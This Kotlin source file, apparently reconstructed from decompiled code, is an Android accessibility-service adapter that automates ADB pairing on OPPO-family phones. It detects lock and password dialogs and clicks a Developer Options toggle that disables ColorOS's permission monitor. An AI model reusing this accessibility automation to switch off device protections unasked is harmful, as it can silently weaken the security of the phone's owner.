package com.storm.safe.rock.service.modules.setup.vendor

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.setup.SetupConstants
import com.storm.safe.rock.service.modules.setup.SetupUiHelper
import java.util.concurrent.atomic.AtomicInteger

/**
 * OppoPairAdapter -- OPPO/ColorOS/realme/OnePlus-specific ADB pairing behavior.
 *
 * Extracted from:
 *   - DialogHandler.handleDisablePermissionMonitor() (L221-306)
 *   - OpenDevelopmentDelegate.isLockDialogClass() ColorOS/OPLUS section (L153-166)
 *
 * JADX: C0360a2.java (method h3 L3286 + C0358a0 c4 L655)
 */
class OppoPairAdapter(
    private val service: AccessibilityService,
    private val context: Context
) : VendorPairAdapter {

    companion object {
        private const val TAG = "OppoPairAdapter"
    }

    override val vendorName = "OPPO"

    // ========================================================================
    // Phase 0: Developer Options -- OPPO needs version info sub-page
    // ========================================================================

    /**
     * OPPO/realme/OnePlus needs to navigate through a "Version Info" sub-page
     * inside About Phone before finding the build number.
     * vendor: P() method brand check — kg1.m213521c7 (isOppo: oppo/realme/oneplus)
     */
    override fun needsVersionInfoPage(): Boolean = true

    // ========================================================================
    // Lock Dialog -- ColorOS / OPLUS lock screen detection
    // ========================================================================

    /**
     * Detect ColorOS and OPLUS lock/password confirmation dialogs.
     * vendor: C0358a0.java c4 (line 655) -- ColorOS + OPLUS sections
     *
     * Returns true if className contains:
     *   - "coloros" AND any of: lock, Lock, password, Password
     *   - "oplus" AND any of: lock, Lock, password, Password
     */
    override fun isVendorLockDialog(className: String): Boolean {
        if (className.contains("coloros") &&
            (className.contains("lock") || className.contains("Lock") ||
                className.contains("password") || className.contains("Password"))
        ) {
            return true
        }
        if (className.contains("oplus") &&
            (className.contains("lock") || className.contains("Lock") ||
                className.contains("password") || className.contains("Password"))
        ) {
            return true
        }
        return false
    }

    // ========================================================================
    // Post-Pairing -- Disable OPPO permission monitor toggle
    // ========================================================================

    /**
     * After pairing completes, scroll to find "disable permission monitor" toggle
     * in developer options and enable it.
     *
     * vendor: h3 (line 3286) -- OPPO disable permission monitor
     *
     * Steps:
     *   1. Skip if already done
     *   2. Find scrollable view (with retry)
     *   3. Scroll to bottom, then search for permission monitor text
     *   4. If found: check toggle state; if not checked, click to enable
     *   5. Re-verify after click
     *   6. Retry up to 2 times
     */
    override fun onPairingComplete(service: AccessibilityService) {
        Log.d(TAG, "OPPO: pairing complete, handling disable permission monitor")
        handleDisablePermissionMonitor(false)
    }

    /**
     * Full implementation of OPPO disable permission monitor.
     * vendor: h3 (line 3286)
     *
     * @param alreadyDone whether this has already been completed
     * @return true if permission monitor is now disabled, false otherwise
     */
    fun handleDisablePermissionMonitor(alreadyDone: Boolean): Boolean {
        var done = alreadyDone
        if (done) {
            Log.i(TAG, "OPPO permission monitor already disabled, skipping")
            return done
        }
        val retryCounter = AtomicInteger(0)
        while (!done && retryCounter.incrementAndGet() <= 2) {
            try {
                val root = service.rootInActiveWindow ?: continue
                val scrollable = findScrollableViewWithRetry(root)
                if (scrollable == null) {
                    Log.w(TAG, "OPPO: scrollable view not found")
                    SetupUiHelper.sleep200(10)
                    continue
                }

                // Scroll to bottom first
                if (scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) {
                    Log.i(TAG, "OPPO: scrolled to bottom...")
                    SetupUiHelper.sleep200(5)
                }

                val root2 = service.rootInActiveWindow ?: continue
                val scrollable2 = findScrollableViewWithRetry(root2)
                val permMonitorTexts = SetupConstants.OPPO_DISABLE_PERM_MONITOR_TEXTS
                var targetNode: AccessibilityNodeInfo? = null

                if (scrollable2 != null) {
                    targetNode = SetupUiHelper.findNodeByTexts(root2, permMonitorTexts)
                    if (targetNode == null) {
                        // Try scrolling forward to find it
                        for (i in 0 until 3) {
                            val scrolled = scrollable2.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                            if (!scrolled) break
                            SetupUiHelper.sleep200(5)
                            val r = service.rootInActiveWindow ?: break
                            targetNode = SetupUiHelper.findNodeByTexts(r, permMonitorTexts)
                            if (targetNode != null) break
                        }
                    }
                }

                if (targetNode != null) {
                    Log.i(TAG, "OPPO: disable permission monitor item found")
                    val clickableParent = SetupUiHelper.findClickableParent6(targetNode)
                        ?: targetNode.parent
                    val toggle = if (clickableParent != null) SetupUiHelper.findToggleNode(clickableParent) else null
                    if (toggle != null && toggle.isChecked) {
                        done = true
                        Log.i(TAG, "OPPO: permission monitor already disabled (checked state)")
                        return done
                    }

                    val clickTarget = SetupUiHelper.findClickableParent6(targetNode) ?: targetNode
                    if (clickTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "OPPO: clicked disable permission monitor")
                        SetupUiHelper.sleep200(10)
                        val root3 = service.rootInActiveWindow
                        if (root3 != null) {
                            val recheckNode = SetupUiHelper.findNodeByTexts(root3, permMonitorTexts)
                            if (recheckNode != null) {
                                val parent2 = SetupUiHelper.findClickableParent6(recheckNode)
                                    ?: recheckNode.parent
                                val toggle2 = if (parent2 != null) SetupUiHelper.findToggleNode(parent2) else null
                                val checked = toggle2?.isChecked ?: true
                                done = checked
                                Log.i(TAG, "OPPO: permission monitor post-click state: checked=$checked")
                            } else {
                                done = true
                            }
                        }
                    }
                    if (done) return done
                } else {
                    Log.w(TAG, "OPPO: disable permission monitor item not found, retry ${retryCounter.get()}")
                }
                SetupUiHelper.sleep200(10)
            } catch (e: Exception) {
                Log.e(TAG, "OPPO handleDisablePermissionMonitor error", e)
            }
        }
        Log.i(TAG, "OPPO: disable permission monitor done=$done")
        return done
    }

    // ========================================================================
    // Private helpers
    // ========================================================================

    /**
     * Find scrollable view with retry logic.
     * vendor: d6 (line 2401) -- simplified for OppoPairAdapter use
     */
    private fun findScrollableViewWithRetry(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) return null
        return try {
            val attempts = AtomicInteger(0)
            var currentRoot: AccessibilityNodeInfo = root

            while (attempts.incrementAndGet() < 10) {
                val recyclerView = SetupUiHelper.findNodeByClassName(currentRoot, "androidx.recyclerview.widget.RecyclerView")
                if (recyclerView != null && recyclerView.isScrollable) return recyclerView

                val listView = SetupUiHelper.findNodeByClassName(currentRoot, "android.widget.ListView")
                if (listView != null && listView.isScrollable) return listView

                val scrollView = SetupUiHelper.findNodeByClassName(currentRoot, "android.widget.ScrollView")
                if (scrollView != null && scrollView.isScrollable) return scrollView

                val generic = SetupUiHelper.findScrollableNode(currentRoot)
                if (generic != null) return generic

                SetupUiHelper.sleep200(5)
                val newRoot = service.rootInActiveWindow
                if (newRoot != null) {
                    currentRoot = newRoot
                } else {
                    currentRoot.refresh()
                }
            }
            null
        } catch (e: Exception) {
            Log.e(TAG, "findScrollableViewWithRetry error", e)
            null
        }
    }
}
